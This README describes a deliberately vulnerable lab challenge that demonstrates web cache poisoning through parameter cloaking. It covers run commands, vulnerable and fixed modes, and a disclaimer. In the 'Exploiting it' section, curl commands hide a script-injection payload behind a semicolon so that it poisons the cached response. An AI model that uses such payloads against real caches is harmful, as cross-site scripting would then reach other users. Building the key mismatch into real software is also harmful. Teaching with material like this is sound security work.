# Cache Poisoning via Parameter Cloaking

This challenge demonstrates parameter cloaking (a form of web cache entanglement): the shared cache in front of `/greet` keys on the query string up to the first `;`, while the origin application parses `;` as an additional parameter separator (as some frameworks, e.g. Rails, historically do). An attacker can "cloak" a payload behind a semicolon so it reaches the origin but is invisible to the cache key, poisoning the cached entry for every other caller with the same visible key.

## How to run it

```bash
go run main.go serve
```

## Endpoint

- `GET /greet?id=1` — reflects the `name` query parameter into the response

## Exploiting it

```bash
# the cache keys on "id=1" only; the origin still reads "name" after the ";"
curl "http://localhost:8080/greet?id=1;name=<script>alert(1)</script>"

# any subsequent caller asking for id=1 gets the poisoned, cloaked response
curl "http://localhost:8080/greet?id=1"
```

## Modes

The server supports two modes, toggled with the `--vulnerable` flag on the `serve` command (defaults to `true`):

```bash
# vulnerable: the cache key stops at the first ";", but the origin still parses parameters after it
go run main.go serve --vulnerable=true

# fixed: the cache key includes the full, unmodified query string, and the origin never treats ";" as a parameter separator
go run main.go serve --vulnerable=false
```

## Disclaimer

This challenge is intentionally vulnerable. Do not deploy it on a publicly accessible server, as this could expose you to attacks.

Learn more about API security at [Cerberauth](https://www.cerberauth.com/)
